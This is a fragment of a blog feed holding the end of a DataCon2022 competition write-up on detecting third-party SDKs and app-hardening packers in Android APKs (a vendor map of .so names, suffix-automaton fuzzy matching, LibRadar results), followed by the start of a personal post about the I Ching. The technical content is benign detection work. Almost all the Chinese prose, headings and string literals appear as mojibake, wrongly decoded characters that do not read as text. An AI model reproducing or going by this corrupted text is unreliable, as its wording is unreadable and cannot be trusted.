class="hljs-string">&quot;libjgdtc_a64.so&quot;</span>, <span class="hljs-string">&quot;360åŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libjgdtc_x64.so&quot;</span>, <span class="hljs-string">&quot;360åŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libjgdtc_art.so&quot;</span>, <span class="hljs-string">&quot;360åŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libegis.so&quot;</span>, <span class="hljs-string">&quot;é€šä»˜ç›¾&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libNSaferOnly.so&quot;</span>, <span class="hljs-string">&quot;é€šä»˜ç›¾&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libapssec.so&quot;</span>, <span class="hljs-string">&quot;ç››å¤§åŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;librsprotect.so&quot;</span>, <span class="hljs-string">&quot;ç‘æ˜ŸåŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libitsec.so&quot;</span>, <span class="hljs-string">&quot;æµ·äº‘å®‰åŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libnqshield.so&quot;</span>, <span class="hljs-string">&quot;ç½‘ç§¦åŠ å›º&quot;</span>);<br>sMap.<span class="hljs-meta">put</span>(<span class="hljs-string">&quot;libbaiduprotect.so&quot;</span>, <span class="hljs-string">&quot;ç™¾åº¦åŠ å›º&quot;</span>);<br>...<br></code></pre></td></tr></table></figure><p>éå†åŠ¨æ€åº“ç›®å½•ä¸‹æ‰€æœ‰lib*.soæ–‡ä»¶ï¼Œåˆ©ç”¨æ­£åˆ™æå–ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¹¶å°†å‰©ä½™éƒ¨åˆ†ä¸SDKæ•°æ®åº“è¿›è¡Œæ¨¡ç³ŠåŒ¹é…ï¼Œå¾—åˆ°åŒ¹é…ç»“æœã€‚</p><p>å¯¹äºä¸€äº›è¢«æ··æ·†çš„æ˜æ˜¾æ— æ„ä¹‰ç»“æœï¼Œå¦‚libaab.soã€libdddd.soã€libxxxxx.soï¼Œæˆ‘ä»¬é€šè¿‡ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„ç§ç±»å°†å…¶è¿‡æ»¤æ‰ã€‚æœ‰ä¸€äº›è¯è¯­å®¹æ˜“è¢«è¯†åˆ«ä¸ºç‰ˆæœ¬ï¼Œå¦‚<code>3d, v8, x86, x64, armeabi-v7a</code>ï¼Œæˆ‘ä»¬ç»´æŠ¤ä¸€ä¸ªé»‘åå•è¿‡æ»¤æ‰ã€‚</p><h2 id="2-4-SDK-Nameæ¨¡ç³Šæœç´¢"><a href="#2-4-SDK-Nameæ¨¡ç³Šæœç´¢" class="headerlink" title="2.4 SDK Nameæ¨¡ç³Šæœç´¢"></a>2.4 SDK Nameæ¨¡ç³Šæœç´¢</h2><h3 id="2-4-1-æ•°æ®çš„çˆ¬å–"><a href="#2-4-1-æ•°æ®çš„çˆ¬å–" class="headerlink" title="2.4.1  æ•°æ®çš„çˆ¬å–"></a>2.4.1  æ•°æ®çš„çˆ¬å–</h3><p>æˆ‘ä»¬æ•°æ®çš„ä¸»è¦æ¥æºæœ‰ï¼š</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%206.png" alt="æ•°æ®æ¥æºæ€»è§ˆ"></p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¯¹äºå›½å†…SDKçš„æ•°æ®åº“ï¼Œçˆ¬åˆ°çš„åªæœ‰ä¸­æ–‡çš„SDKåå’Œå‚å•†åï¼Œå¦‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%207.png" alt="SDK Nameä¸å‚å•†æ˜ å°„"></p><p>è€ŒåŒ¹é…çš„ç›®æ ‡åˆ™æ˜¯è‹±æ–‡æ ‡è¯†ç¬¦ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">TencentMapSDK<br>UMENG_APPKEY<br>com.bytedance.frameworks<br>com.fadai.particlesmasher<br>XIAOMI_PUSH<br></code></pre></td></tr></table></figure><p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬æŠŠSDKçš„åå­—ã€å‚å•†åˆ†åˆ«ç¿»è¯‘ä¸ºè‹±è¯­ã€æ‹¼éŸ³åæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œæå‡å­ä¸²çš„åŒ¹é…èƒ½åŠ›ã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%208.png" alt="example"></p><p>2.4.2 æ¨¡ç³ŠåŒ¹é…ç®—æ³•</p><p>æˆ‘ä»¬çš„æ¨¡ç³ŠåŒ¹é…é‡‡ç”¨äº†æœ€é•¿å…¬å…±å­ä¸²ç®—æ³•ï¼Œç”±äºåŠ¨æ€è§„åˆ’çš„æ•ˆç‡å¤ªä½ï¼Œæˆ‘ä»¬æ”¹è¿›ä¸ºåœ¨åç¼€è‡ªåŠ¨æœºä¸Šè¿›è¡ŒåŒ¹é…ã€‚æ”¹è¿›åçš„ç®—æ³•å¾—åˆ°äº†å¯ä»¥å®¹å¿çš„æ—¶é—´å¤æ‚åº¦ï¼Œå¾—ä»¥ä½¿æˆ‘ä»¬æ‰©å¢æ•°æ®é›†ã€‚</p><p>å¤šæ¨¡æ¿å­ä¸²åŒ¹é…ç®—æ³•ï¼ˆæ¨¡æ¿å­—ç¬¦ä¸²çš„ä¸ªæ•°$k$ï¼Œæ¨¡æ¿å­—ç¬¦ä¸²çš„é•¿åº¦$m$ï¼Œå¾…åŒ¹é…å­—ç¬¦ä¸²çš„é•¿åº¦$n$ï¼‰çš„åç¼€è‡ªåŠ¨æœºæ„å»ºä¼ªä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%209.png" alt="ç®—æ³•ä¼ªä»£ç "></p><p>ï¼ˆå¦‚æœownersç”¨setç»´æŠ¤çš„è¯ç©ºé—´å¤æ‚åº¦è¿˜å¯ä»¥é™åˆ°$k<em>m$ï¼Œå¦‚æœæ„å»ºè‡ªåŠ¨æœºæ—¶ç»´æŠ¤ownersï¼Œæ—¶é—´å¤æ‚åº¦ä¹Ÿå¯ä»¥é™åˆ°$k</em>m$ï¼Œä½†å½“æ—¶æ²¡æœ‰è€ƒè™‘è¿™ä¹ˆå¤šï¼‰</p><p>åœ¨åŒ¹é…æ—¶åªéœ€è¦éå†è¢«æœç´¢ä¸²çš„åç¼€ï¼Œåœ¨è‡ªåŠ¨æœºä¸Šè¿›è¡Œæœç´¢ã€‚è¿™æ ·ï¼Œæ„å»ºçš„æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦ä¸º$O(k<em>m^2)$ï¼Œå…¶ä¸­nå¾ˆå°ã€‚è€ŒåŒ¹é…çš„æ—¶é—´å¤æ‚åº¦åˆ™ç”±$O(k</em>n*m)$é™ä½ä¸ºäº†$O(n^2)$ï¼Œè¿™ä¸ªæå‡åœ¨kå¾ˆå¤§ï¼ˆæ¨¡æ¿ä¸ªæ•°å¾ˆå¤šï¼‰ï¼Œè€Œ$n$å¾ˆå°ï¼ˆå¾…åŒ¹é…ä¸²å¾ˆçŸ­ï¼‰çš„æƒ…å†µä¸‹æ˜¯å¾ˆæ˜¾è‘—çš„ã€‚åœ¨æ•°æ®åº“æœ‰æ¥è¿‘3000é¡¹æ—¶ï¼Œåªéœ€è¦12åˆ†é’Ÿå³å¯å®Œæˆ2000ä¸ªAPKçš„åˆ†æã€‚</p><h2 id="2-5-åŸºäºä»£ç è¡Œä¸ºç‰¹å¾çš„æ£€æµ‹"><a href="#2-5-åŸºäºä»£ç è¡Œä¸ºç‰¹å¾çš„æ£€æµ‹" class="headerlink" title="2.5 åŸºäºä»£ç è¡Œä¸ºç‰¹å¾çš„æ£€æµ‹"></a>2.5 åŸºäºä»£ç è¡Œä¸ºç‰¹å¾çš„æ£€æµ‹</h2><p>é’ˆå¯¹APKæ··æ·†çš„æƒ…å†µï¼Œç”±äºåŒ…åã€æ–‡ä»¶åå’ŒåŒ…ç»“æ„éƒ½å¯èƒ½è¢«æ”¹å˜ï¼ŒåŸºäºå·²çŸ¥åº“çš„åŒ…åç™½åå•æ˜¯éš¾ä»¥å¤„ç†æ··æ·†ä»£ç çš„ï¼Œå› æ­¤éœ€è¦å¯»æ‰¾ä¸åå­—æ— å…³çš„ä»£ç ç‰¹å¾è¿›è¡Œåˆ†ææ£€æµ‹ï¼Œè€ŒåŸºäºä»£ç è¡Œä¸ºç‰¹å¾çš„æ£€æµ‹æ˜¯ä¸ä¼šè¢«æ··æ·†æ”¹å˜çš„ï¼Œèƒ½å¤Ÿæœ‰æ•ˆåœ°å¤„ç†æ··æ·†æƒ…å†µã€‚</p><h3 id="2-5-1-é€‰æ‹©å¼€æºå·¥å…·"><a href="#2-5-1-é€‰æ‹©å¼€æºå·¥å…·" class="headerlink" title="2.5.1 é€‰æ‹©å¼€æºå·¥å…·"></a>2.5.1 é€‰æ‹©å¼€æºå·¥å…·</h3><p>ç”±äºæœ¬æ¬¡æ¯”èµ›æ—¶é—´ä¸é•¿ï¼Œé¢å¯¹2000ä¸ªç›®æ ‡apkï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿä½¿ç”¨å¿«é€Ÿä¸”å‡†ç¡®çš„å·¥å…·è¿›è¡Œåˆ†æã€‚é€šè¿‡è°ƒç ”å„å¼€æºAndroidç¬¬ä¸‰æ–¹åº“æ£€æµ‹å·¥å…·ï¼Œæˆ‘ä»¬å‘ç°Libradaræœ€å…·é«˜æ•ˆæ€§ä¸”å®ç°æˆæœ¬è¾ƒä½ï¼Œåœ¨å®éªŒå°è¯•ï¼ˆLiteradarï¼‰è½»é‡ç‰ˆLibradarä»¥åŠLibscoutåï¼Œå‘ç°Literadaræ•ˆæœä¸é”™ï¼Œè€ŒLibscoutå’Œå…¶ä»–å¤§å¤šå¼€æºå·¥å…·æ²¡æœ‰æä¾›ç‰¹å¾æ•°æ®åº“ï¼Œéœ€è¦äººä¸ºæ”¶é›†å¤§é‡Android apkè¿›è¡Œç‰¹å¾æå–ï¼Œæ—¶é—´æˆæœ¬è¾ƒå¤§ï¼Œç»¼ä¸Šï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥å®‰è£…Libradarè¿›è¡Œåˆ†æã€‚</p><p><a href="https://github.com/pkumza/LibRadar">GitHub - pkumza&#x2F;LibRadar: LibRadar - A detecting tool for 3rd-party libraries in Android apps.</a></p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%2010.png"></p><h3 id="2-5-2-Libradarç®€ä»‹"><a href="#2-5-2-Libradarç®€ä»‹" class="headerlink" title="2.5.2 Libradarç®€ä»‹"></a>2.5.2 Libradar<strong>ç®€ä»‹</strong></h3><p>Libradaræ˜¯ä¸€ä¸ªåŸºäºAPIç‰¹æ€§çš„Androidç¬¬ä¸‰æ–¹åº“æ£€æµ‹å·¥å…·ã€‚é€šè¿‡åˆ†æè¶…è¿‡100ä¸‡ä¸ªAndroid åº”ç”¨ç¨‹åºï¼ŒLibradaré€‰æ‹©äº†ç¨³å®šçš„APIè°ƒç”¨ç‰¹å¾ä»¥åŠæ–‡ä»¶å¤¹ç›®å½•çš„å“ˆå¸Œå€¼ï¼Œå¹¶ä½¿ç”¨å¤šçº§èšç±»æ¥ç”ŸæˆæŒ‡çº¹åº“ï¼Œåœ¨æ£€æµ‹ç»™å®šçš„æ–°Androidåº”ç”¨ç¨‹åºæ—¶åªéœ€é™æ€åˆ†æå’Œæ¯”è¾ƒå°±å¯ä»¥å¿«é€Ÿè·å¾—å…¶ä¸­çš„ç¬¬ä¸‰æ–¹åº“ã€‚</p><p><a href="https://ieeexplore.ieee.org/document/7883363">LibRadar: Fast and Accurate Detection of Third-Party Libraries in Android Apps | IEEE Conference Publication | IEEE Xplore</a></p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%2011.png"></p><h3 id="2-5-3-å·¥å…·åŸç†"><a href="#2-5-3-å·¥å…·åŸç†" class="headerlink" title="2.5.3 å·¥å…·åŸç†"></a>2.5.3 å·¥å…·åŸç†</h3><ol><li><p>Libradarä½¿ç”¨Apktoolåç¼–è¯‘Androidåº”ç”¨ç¨‹åºä¸ºSmaliä»£ç ã€‚</p></li><li><p>ä½¿ç”¨ç‰¹å¾å“ˆå¸Œè·å–Smaliä»£ç ä¸­çš„å„æ–‡ä»¶å¤¹ç­¾åï¼Œæå–åŒ…ç»“æ„ä¸­çš„APIæ€»æ•°å’ŒAPIç±»å‹ï¼Œå…±åŒæ„å»ºç‰¹å¾å‘é‡ã€‚ï¼ˆæ­¤ç±»APIç‰¹æ€§åœ¨æ··æ·†è¿‡ç¨‹ä¸­ä¸ä¼šè¢«ä¿®æ”¹ï¼Œå¯ä»¥æä¾›ç¨³å®šä¸”å‡†ç¡®çš„æŒ‡ç¤ºï¼‰</p><p> <img src="/2023/01/28/DataCon2022WriteUp/Untitled%2012.png"></p></li><li><p>åœ¨ç”ŸæˆæŒ‡çº¹åº“é˜¶æ®µï¼Œå¯¹å„ä¸ªåŒ…æå–çš„ç‰¹å¾è¿›è¡Œå¤šçº§èšç±»ï¼Œç¡®å®šæ½œåœ¨åº“åŠå…¶æ•£åˆ—ç‰¹å¾çš„åˆ—è¡¨ï¼›åœ¨åˆ†æç»™å®šåº”ç”¨é˜¶æ®µï¼Œå°†æå–çš„æ¯ä¸ªæ–‡ä»¶å¤¹çš„ç‰¹å¾ä¸æŒ‡çº¹åº“è¿›è¡Œæ¯”è¾ƒï¼Œæ£€æµ‹ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“ã€‚</p></li></ol><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%2013.png"></p><h3 id="2-5-4-ä½¿ç”¨åŠç»“æœ"><a href="#2-5-4-ä½¿ç”¨åŠç»“æœ" class="headerlink" title="2.5.4 ä½¿ç”¨åŠç»“æœ"></a>2.5.4 ä½¿ç”¨åŠç»“æœ</h3><p>2000ä¸ªAPKï¼Œ880ä¸ªæ£€æµ‹æ— æ•ˆï¼ˆ859ä¸ªä¸ºç©ºï¼Œ21ä¸ªå¤±è´¥ï¼‰ï¼Œå…¶ä½™1120ä¸ªéƒ½æˆåŠŸæ£€æµ‹å‡ºç¬¬ä¸‰æ–¹åº“ã€‚è¾“å‡ºç»“æœä¾‹å­å¦‚ä¸‹ï¼šä¸€ä¸ªæ£€å‡ºåº“ä¿¡æ¯ä¸­libraryå’Œpackageå¯¹åº”é¢˜ç›®éœ€è¦çš„sdk_nameå’Œsdk_pathã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%2014.png"></p><h1 id="ä¸‰ã€æ¢ç´¢å’Œåç»­-1"><a href="#ä¸‰ã€æ¢ç´¢å’Œåç»­-1" class="headerlink" title="ä¸‰ã€æ¢ç´¢å’Œåç»­"></a>ä¸‰ã€æ¢ç´¢å’Œåç»­</h1><h2 id="3-1-æ¢ç´¢-2"><a href="#3-1-æ¢ç´¢-2" class="headerlink" title="3.1 æ¢ç´¢"></a>3.1 æ¢ç´¢</h2><h3 id="3-1-1-å¼€æºå·¥å…·åº“çš„è°ƒç ”"><a href="#3-1-1-å¼€æºå·¥å…·åº“çš„è°ƒç ”" class="headerlink" title="3.1.1 å¼€æºå·¥å…·åº“çš„è°ƒç ”"></a>3.1.1 å¼€æºå·¥å…·åº“çš„è°ƒç ”</h3><p>æˆ‘ä»¬å‚è€ƒäº†è®ºæ–‡[ã€ŠA Systematic Assessment on Android Third-Party Library Detection Toolsã€‹](A Systematic Assessment on Android Third-Party Library Detection Tools | IEEE Journals &amp; Magazine | IEEE Xplore)ï¼Œå°è¯•å¹¶ä½¿ç”¨äº†Libradarã€Libscoutä»¥åŠlibpeckerã€‚ç”±äºLibscoutç‰¹å¾æ•°æ®åº“ä¸å…¨ï¼Œéœ€è¦äººä¸ºæ”¶é›†æ‰èƒ½è¾¾åˆ°å¥½çš„æ•ˆæœï¼Œå› æ­¤åœ¨æ—¶é—´æˆæœ¬çš„è€ƒè™‘ä¸‹é€‰æ‹©æš‚æ—¶æ”¾å¼ƒï¼›ä¹‹åå®‰è£…Literadarè¿›è¡Œå®éªŒï¼Œåˆ†æè®¤ä¸ºå…·å¤‡å¯ç”¨æ€§åå®‰è£…äº†Libradarä½œä¸ºç­”æ¡ˆçš„ä¸€éƒ¨åˆ†ã€‚</p><h3 id="3-1-2-å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•çš„è¿­ä»£"><a href="#3-1-2-å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•çš„è¿­ä»£" class="headerlink" title="3.1.2 å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•çš„è¿­ä»£"></a>3.1.2 å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•çš„è¿­ä»£</h3><p>åœ¨å­—ç¬¦ä¸²æ¨¡ç³ŠåŒ¹é…ç®—æ³•ä¸Šï¼Œæˆ‘ä»¬å…ˆå°è¯•äº†æœ€é•¿å…¬å…±å­åºåˆ—ç®—æ³•ï¼Œå‘ç°å®ƒåœ¨æ²¡æœ‰åˆé€‚åŒ¹é…æ—¶ä¼šè¯¯åˆ†å‰²äº§ç”Ÿé”™è¯¯çš„ç»“æœï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%2015.png"></p><p>äºæ˜¯æˆ‘ä»¬æ”¹ç”¨äº†æœ€é•¿å…¬å…±å­ä¸²ç®—æ³•ï¼Œä½†æ˜¯ä¼šå‡ºç°é•¿å•è¯å¤ºå–åŒ¹é…çš„é—®é¢˜ï¼Œå¦‚ä¸‹ï¼ŒFrameworkçš„é•¿åº¦ä¸º9ï¼Œå¤ºèµ°äº†æœ¬åº”è¯¥åŒ¹é…åˆ°çš„GaodeMapï¼š</p><p><img src="/2023/01/28/DataCon2022WriteUp/Untitled%2016.png"></p><p>å¯¹æ­¤ï¼Œæˆ‘ä»¬çš„è§£å†³æ–¹æ³•æ˜¯ç»´æŠ¤ä¸€ä¸ªå¸¸è§çš„é•¿å•è¯é»‘åå•å¦‚frameworkã€androidç­‰ï¼Œå°†é•¿å•è¯è¿‡æ»¤åå†è¿›è¡ŒåŒ¹é…ã€‚æˆ‘ä»¬è®¾ç½®çš„åŒ¹é…é˜ˆå€¼æ˜¯ï¼šåŒ¹é…é•¿åº¦å¤§äº7ä¸ªå­—ç¬¦æˆ–ç›®æ ‡ä¸²æ€»é•¿åº¦çš„70%ï¼Œå°±è¾“å‡ºç»“æœã€‚</p><h2 id="3-2-åç»­-2"><a href="#3-2-åç»­-2" class="headerlink" title="3.2 åç»­"></a>3.2 åç»­</h2><p>ç”±äºæ—¶é—´åŸå› ï¼Œæˆ‘ä»¬çš„ä¸€äº›æƒ³æ³•è¿˜æœªå®ç°ï¼Œå¦‚ï¼š</p><ol><li><p>æ£€æµ‹ç»“æœçš„è¿›ä¸€æ­¥æ¸…æ´—ä¸åˆå¹¶</p></li><li><p>å¯¹ä¸€äº›ç‰¹æ®Šå¤„ç†ã€æ ¡éªŒå’Œé”™è¯¯çš„APKåŒ…è¿›è¡Œåˆ†æã€ä¿®å¤ï¼ˆæ­¤å‰å…¨éƒ¨è·³è¿‡äº†ï¼‰</p> <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">badlist = <span class="hljs-punctuation">[</span>&#x27;<span class="hljs-number">220.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1027.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">706.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">557.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1411.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">99.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">814.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1596.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">86.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1621.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1687.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">745.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1075.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">723.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">626.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">113.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">721.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">463.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">574.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1089.</span>apk&#x27;<span class="hljs-punctuation">,</span> &#x27;<span class="hljs-number">1355.</span>apk&#x27;<span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure></li><li><p>æœ‰äº›åŠ¨æ€åº“åç§°è¢«åŠ å¯†æ··æ·†ï¼Œå¯ä»¥å°è¯•ä»ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨æå–ä¿¡æ¯ã€‚</p></li><li><p>ç”±äºLibradarä¸èƒ½ç²¾ç¡®è·å–ç¬¬ä¸‰æ–¹åº“çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œä¸”åœ¨æ··æ·†ä»£ç çš„æ£€æµ‹ä¸Šæ•ˆæœå¹¶ä¸ä¼˜ç§€ï¼Œåç»­å¯ä»¥æ”¹è¿›å®ƒçš„åŒ¹é…ç®—æ³•ï¼Œç»Ÿè®¡æ›´å¤šçš„ç‰¹å¾ï¼Œæ”¶é›†Android apkæ•°æ®ï¼Œå®ç°å¯¹ç‰ˆæœ¬çš„è¯†åˆ«ã€‚</p></li></ol><h1 id="å››ã€æ€»ç»“-2"><a href="#å››ã€æ€»ç»“-2" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h1><p>æ„Ÿè°¢ä¸»åŠæ–¹æä¾›äº†è¿™ä¸ªå¹³å°ä½¿æˆ‘ä»¬å­¦ä¹ å’Œè¿›æ­¥ï¼Œæ„Ÿè°¢å®‰å“å‡ºé¢˜äººçš„è€å¿ƒç­”ç–‘å’Œè¾›è‹¦åˆ¤é¢˜ã€‚é€šè¿‡æœ¬èµ›é¢˜ï¼Œæˆ‘ä»¬äº†è§£åˆ°äº†APKçš„ç»“æ„å’Œå®‰å“ç¬¬ä¸‰æ–¹åº“çš„åŸºæœ¬çŸ¥è¯†ï¼Œé€šè¿‡èµ›æ–¹æä¾›çš„æ¨èè®ºæ–‡å’Œè‡ªå·±çš„è°ƒç ”ï¼Œæˆ‘ä»¬å­¦ä¹ åˆ°äº†å„ç§æ£€æµ‹ç¬¬ä¸‰æ–¹åº“çš„æ€æƒ³å’Œæ–¹æ³•ï¼Œåœ¨å®è·µæ“ä½œä¸Šä¹Ÿå¾—åˆ°äº†é”»ç‚¼ï¼Œç”šè‡³é‡æ¸©äº†ä»¥å‰å­¦ä¹ çš„ç®—æ³•çŸ¥è¯†ã€‚æ¯”èµ›çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¸€ç›´éƒ½æ²¡æœ‰æ”¾å¼ƒï¼Œå³ä½¿æ¯”åˆ†è½åç¬¬ä¸€åä¸€å¤§åŠçš„æ—¶å€™ï¼Œå¸ˆå…„ä¹Ÿä¸€ç›´åœ¨é¼“åŠ±æˆ‘ï¼Œç»™æˆ‘ä»¬åŠ æ²¹ï¼Œæœ€åç»ˆäºè¿½äº†ä¸Šå»ã€‚è™½ç„¶æœ€åå·®äº†ä¸€ç‚¹åˆ†æ•°ï¼Œä½†ä¹Ÿæ˜¯ä¸é”™çš„ç»“æœäº†ã€‚</p><p>æ¯”èµ›ç»“æŸåæˆ‘ä»¬æ•´ç†ç­”æ¡ˆæ—¶ï¼Œæˆ‘å‘ç°ä¸»è¦é—®é¢˜è¿˜æ˜¯æ•°æ®åº“è§„æ¨¡ä¸å¤Ÿï¼Œå¾ˆå¤šSDK NameåŒ¹é…ä¸ä¸Šã€‚æˆ‘ä»¬çˆ¬è™«å¼€çš„å¤ªæ™šï¼ˆå€’æ•°ç¬¬äºŒå¤©æ‰æƒ³åˆ°å¢åŠ æ•°æ®é‡ï¼Œæœ€åä¸€å¤©æ‰å¼€å§‹çˆ¬ï¼‰ã€‚è¿™ä¹Ÿè®©æˆ‘è®¤è¯†åˆ°åœ¨å¤§æ•°æ®ç ”ç©¶ä¸­ï¼Œæ•°æ®é‡æ˜¯åŸºç¡€ã€‚æ„Ÿè°¢DataConæä¾›çš„å¤§æ•°æ®å®‰å…¨å®è·µçš„æœºä¼šï¼Œè®©æˆ‘å¯¹BigDataæœ‰äº†æ›´åˆ‡å®é™…çš„è®¤è¯†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>DataCon</tag>
      
      <tag>å¤§æ•°æ®å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¦»è€…ï¼Œä¸½ä¹Ÿ</title>
    <link href="/2023/01/28/begin/"/>
    <url>/2023/01/28/begin/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©æ˜¯ç™¸å¯å¹´æ­£æœˆåˆä¸ƒã€‚</p><p>è¿™æ˜¯æœ¬åšå®¢çš„ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œä¹Ÿå°±æ¥è®²è®²ä¸€äº›æœ‰çš„æ²¡çš„ã€‚</p><p>å…ˆæ¥è¯´è¯´åšå®¢çš„èµ·å› ã€ç”¨é€”å§ã€‚æœ¬ç§‘çš„æ—¶å€™ä¹Ÿå†™è¿‡å‡ ç¯‡ï¼Œä½†æ˜¯ç»ˆç©¶è¿˜æ˜¯æ²¡åšæŒä¸‹å»ã€‚åˆ°äº†ä»Šå¹´å¼€å§‹è¯»ç ”ï¼Œå¸ˆå…„å¶ç„¶ä¸­æèµ·éœ€è¦è®¤çœŸè®°å½•ä¸‹ç ”ç©¶ç”Ÿçš„ç»å†ï¼Œæ–¹ä¾¿æœªæ¥æ‰¾å·¥ä½œï¼Œå†åŠ ä¹‹å…ˆå‰çœ‹åˆ°ä¸€äº›å¤§ä½¬æå…·ä¸ªæ€§çš„ç½‘ç«™ï¼Œä¹Ÿå°±èŒç”Ÿäº†è¿™ä¸ªæƒ³æ³•ã€‚</p><p>å¼€å§‹æƒ³æ¥æ˜¯è®°å½•ä¸€ä¸‹HWæˆ–æ˜¯ä¸€äº›æ¯”èµ›çš„ç»å†å’ŒWPï¼Œåæ¥åˆè§‰å¾—å¯ä»¥ä¸å¤§å®¶åˆ†äº«ä¸€ä¸‹ä¸ªäººåœ¨ã€Šæ˜“ç»ã€‹æ–¹é¢çš„å­¦ä¹ å’Œé¢†æ‚Ÿã€‚åœ¨ã€Šæ˜“ç»ã€‹ä¸Šï¼Œæˆ‘æƒ³å°±åˆ†äº«ä¸€äº›æ˜“ç†éƒ¨åˆ†çš„å†…å®¹ï¼Œä¾‹å¦‚ä»ã€Šæ˜“ç»ã€‹ä¸­å­¦åˆ°çš„ä¸ºäººå¤„äº‹ä¹‹é“ç­‰ã€‚è‡³äºæœ¯æ•°æ–¹é¢ï¼Œå¯èƒ½ä¼šå¼•æ¥ä¸å¿…è¦çš„éº»çƒ¦ï¼Œå†è€…è¿™æ–¹é¢æˆ‘ä¹Ÿåªæ˜¯æµ…å°è¾„æ­¢ç½¢äº†ã€‚</p><p>å†æ¥è¯´è¯´â€œç¦»è€…ï¼Œä¸½ä¹Ÿã€‚å±¥é”™ç„¶ï¼Œæ•¬ä¹‹æ— å’â€è¿™å¥è¯å§ã€‚â€œç¦»è€…ï¼Œä¸½ä¹Ÿâ€ï¼Œæ˜¯ã€Šå½–è¾ã€‹ä¸­å¯¹â€œç¦»ä¸ºç«â€çš„æ€»æ‹¬ï¼›â€œå±¥é”™ç„¶ï¼Œæ•¬ä¹‹æ— å’â€ï¼Œæ˜¯â€œç¦»ä¸ºç«â€çš„åˆçˆ»çˆ»è¾ã€‚æˆ‘æ˜¯ä¸æ“…é•¿åšå–åå­—ä¹‹ç±»çš„äº‹ï¼Œå¤§ä½“æ˜¯å› ä¸ºä¹¦çœ‹çš„å°‘äº†ï¼Œå› è€Œä¸€æ—¶å…´èµ·å°±æ‘‡äº†ä¸€å¦ï¼Œå¾—ç¦»å¦ã€‚</p><p>ç¦»å¦ï¼Œä¸­è™šä¹‹æ˜ï¼Œå½“å‰ç¡®å®éœ€è¦å­¦ä¹ 